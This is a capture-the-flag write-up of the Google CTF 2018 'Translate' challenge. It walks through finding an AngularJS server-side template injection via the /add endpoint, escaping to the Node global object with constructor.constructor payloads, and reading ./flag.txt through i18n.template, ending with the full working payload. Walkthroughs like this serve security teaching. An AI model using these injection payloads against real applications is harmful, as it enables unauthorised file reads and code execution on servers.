# Goal

Get `./flag.txt` from within the template itself.

![translate-overview](https://ylkoh.top/assets/Google-CTF-2018/translateoverview.png)

# Page Analysis

### `/?lang=fr` and `/?lang=en`:    

We've got a page that takes user input on both the English and French page. It prints out the queried word as shown below:

```
    <!----><div ng-if="userQuery">
      <!---->
      <!----><div ng-if="i18n.word(userQuery)">
        En francais, <b>$(frValue)</b> s'écrit <b ng-bind="i18n.word(userQuery)">$(enValue)</b>.
      </div><!---->
    </div><!---->
    <!---->
```

### `/dump`:
Let's look at the source code to see if we can find where the input will be outputted.

```
    english dictionary: {"lang":"en","translate":"Translate","not_found":"I don't know that word, sorry.","in_lang_query_is_spelled":"In french, <b>{{userQuery}}</b> is spelled <b ng-bind=\"i18n.word(userQuery)\"></b>.","input_query":"What French word do you want to translate into English?<br/>A few examples: <a href=\"?query=informatique%20en%20nuage&amp;lang=en\">informatique en nuage</a>, <a href=\"?query=téléverser&amp;lang=en\">téléverser</a>","title":"Translation utility for technical terms in French and English","subtitle":"In the current pluri-polarized great powers context, internationalization is the key for good trans-border understanding between tech workers.","informatique en nuage":"cloud computing","mot-dièse":"hashtag","courriel":"email","téléverser":"upload","ordiphone":"smartphone","original_word":"Word to translate"} <hr/>
    french dictionary:  {"lang":"fr","translate":"Traduire","not_found":"Je ne connais pas ce mot, désolé.","in_lang_query_is_spelled":"En francais, <b>{{userQuery}}</b> s'écrit <b ng-bind=\"i18n.word(userQuery)\"></b>.","input_query":"Quel mot anglais voulez-vous traduire en français ? <br/>Quelques exemples : <a href=\"?query=cloud%20computing&amp;lang=fr\">cloud computing</a>, <a href=\"?query=upload&amp;lang=fr\">to upload</a>","title":"Application de traduction de termes techniques entre français et anglais","subtitle":"Dans notre contexte actuel de multipolarisation des puissances, l'internationalisation est critique au bon entendement transfrontalier des travailleurs des TIC.","upload":"téléverser","cloud computing":"informatique en nuage","hashtag":"mot-dièse","email":"courriel","original_word":"Mot à traduire"} <hr/>    
```

And we've found it on the `/debug` page. Notice where it says `input_query`? This is where the user-controlled value will be displayed. 
Take note of the `i18n.word(userQuery)` object as it may become important later in revealing the path to the `./flag.txt`.

### `/addwords`:

Words can be added to the end of the array in `/dump`, as attempted in Step 1. It is stored in a "key":"value" format.

![debug](https://ylkoh.top/assets/Google-CTF-2018/debug.png)

### `/reset`:

Self-explanatory. Resets the challenge in case you are unable to undo the changes you've made.

# Steps

### 1. Finding the injection point

It looks like there might be a template injection, so let's try submitting the classic `{{7*7}}` payload.

![7x7fail](https://ylkoh.top/assets/Google-CTF-2018/7x7fail.png)

Doh! Clearly we have to add it into the dictionary first. Also notice how `{{userQuery}}` is the element that outputted our input? There must be another way to write into the `input_query`.
Let's take a look at the HTTP request and see if we can manipulate it somehow:     
`GET /add?lang=fr&word=%7B%7B7*7%7D%7D&translated=%7B%7B7*7%7D%7D HTTP/1.1`

Both values are user-controlled. This is when I noticed that `input_query` is not an object, unlike `{{userQuery}}` - what if we wrote a translation for `input_query`?

`GET /add?lang=en&word=input_query&translated={{7*7}}` gives us:

![49](https://ylkoh.top/assets/Google-CTF-2018/49.png)

And we've got it! A successful template injection. Bug bounty hunters would be happy to get up to this step and would probably look for a way to break the Angular JS sandbox in order to get an XSS. But that's not our goal today.

### 2. Experimenting with payloads

Let’s try other queries. How about `{{this}}`?

![this](https://ylkoh.top/assets/Google-CTF-2018/this.png)

Hmm it just says that this is the $SCOPE. Which means that we must be in a constructor now. Maybe we could try to find other global variables too?

Using `{{constructor.constructor('return+global')()}}`,

```
{
	"process": {
	"argv": [],
	"title": "node",
	"version": "v8.11.3",
	"versions": {
	"http_parser": "2.8.0",
	"node": "8.11.3",
	"v8": "6.2.414.54",
	"uv": "1.19.1",
	"zlib": "1.2.11",
	"ares": "1.10.1-DEV",
	"modules": "57",
	"nghttp2": "1.32.0",
	"napi": "3",
	"openssl": "1.0.2o",
	"icu": "60.1",
	"unicode": "10.0",
	"cldr": "32.0",
	"tz": "2017c"
	},
	"arch": "x64",
	"platform": "linux",
	"env": {},
	"pid": 83,
	"features": {
	"debug": false,
	"uv": true,
	"ipv6": true,
	"tls_npn": true,
	"tls_alpn": true,
	"tls_sni": true,
	"tls_ocsp": true,
	"tls": true
	}
	},
	"console": {}
	}
```

Gives us a list of global environment variables. I have formatted it to make it more legible. 

Notice that the angular variables are missing though: we're going to have to append the `angular` property to `global` using the following, adding the json property for legibility:

`{{[constructor.constructor('return+global')().angular=this,constructor.constructor('return+global')()]+|+json}}`

The first element `{{[constructor.constructor('return+global')()` will be evaluated first, so this adds an angular attribute to the global object. By calling Angular we should be able to get the angular object.

```
"$SCOPE",
	{
	"angular": "$SCOPE",
	"process": {
	"argv": [],
	"title": "node",
	"version": "v8.11.3",
	"versions": {
	"http_parser": "2.8.0",
	"node": "8.11.3",
	"v8": "6.2.414.54",
	"uv": "1.19.1",
	"zlib": "1.2.11",
	"ares": "1.10.1-DEV",
	"modules": "57",
	"nghttp2": "1.32.0",
	"napi": "3",
	"openssl": "1.0.2o",
	"icu": "60.1",
	"unicode": "10.0",
	"cldr": "32.0",
	"tz": "2017c"
	},
	"arch": "x64",
	"platform": "linux",
	"env": {},
	"pid": 83,
	"features": {
	"debug": false,
	"uv": true,
	"ipv6": true,
	"tls_npn": true,
	"tls_alpn": true,
	"tls_sni": true,
	"tls_ocsp": true,
	"tls": true
	}
	},
	"console": {}
	}
```

And we've gotten it! 

### 3. Directory Traversal 
Now that we've confirmed the structure, we can access it using `.` like a regular angular element. Let’s get the property names of the angular attributes, appending `.getOwnPropertyNames(global.angular)')()` to the previous payload. 

```
[ "$$childTail", "$$childHead", "$$nextSibling", "$$watchers", "$$listeners", "$$listenerCount", "$$watchersCount", "$id", "$$ChildScope", "$parent", "$$prevSibling", "$$transcluded" 
```

Now we have the angular attributes. Let’s move further up the directory with the $parent, which refers to the $scope of the parent element, using `.getOwnPropertyNames(global.angular.$parent.$parent)')()`

We get a 
```[
	"$SCOPE",
	"$SCOPE"
	]
```

Which means that both are valid controllers (constructors). Let’s try to find the i18n object with `$parent.$parent.i18n`.

```[
	"$SCOPE",
	null
	]
```

Hmm, that’s not quite it. Let’s try taking a step back and move up one level with `$parent.i18n`.

```
[
	"$SCOPE",
	{}
	]
```

And we’ve got it! We’re now in the `i18n` object as denoted by `{}`. We should be able to enumerate templates now, so let’s try appending a template to it.

By calling `/en.json`, it leads us to:

```[
	"$SCOPE",
	"Couldn't load template: Error: ENOENT: no such file or directory, open './en.json'"
	]
```

Argh! We were so close! But let’s take a look at the previous code: we’re now in the template directory but trying to call a file from under `i18n`. So we should prepend `i18n/` to the directory name. 

```
[
	"$SCOPE",
	"{\n \"lang\": \"en\",\n \"translate\": \"Translate\",\n \"not_found\": \"I don't know that word, sorry.\",\n \"in_lang_query_is_spelled\": \"In french, &lt;b&gt;{{userQuery}}&lt;/b&gt; is spelled &lt;b ng-bind=\\\"i18n.word(userQuery)\\\"&gt;&lt;/b&gt;.\",\n \"input_query\": \"What French word do you want to translate into English?&lt;br/&gt;A few examples: &lt;a href=\\\"?query=informatique%20en%20nuage&amp;amp;lang=en\\\"&gt;informatique en nuage&lt;/a&gt;, &lt;a href=\\\"?query=téléverser&amp;amp;lang=en\\\"&gt;téléverser&lt;/a&gt;\",\n \"title\": \"Translation utility for technical terms in French and English\",\n \"subtitle\": \"In the current pluri-polarized great powers context, internationalization is the key for good trans-border understanding between tech workers.\",\n \"informatique en nuage\": \"cloud computing\",\n \"mot-dièse\": \"hashtag\",\n \"courriel\": \"email\",\n \"téléverser\": \"upload\",\n \"ordiphone\": \"smartphone\",\n \"original_word\": \"Word to translate\"\n}\n"
	]

```

We’ve got the page that shows the English translation! Now that we can enumerate any file, it is time to go for the flag.

`GET /add?lang=en&word=input_query&translated={{[constructor.constructor('return+global')().angular%3dthis,constructor.constructor('return+global.angular.$parent.i18n.template("./flag.txt")')()]+|+json}}`

![flag](https://ylkoh.top/assets/Google-CTF-2018/flag.png)

And we've got the flag! 

**Final Payload:** `{{[constructor.constructor('return+global')().angular%3dthis,constructor.constructor('return+global.angular.$parent.i18n.template("./flag.txt")')()]+|+json}}`

**Flag:** `CTF{Televersez_vos_exploits_dans_mon_nuagiciel}`
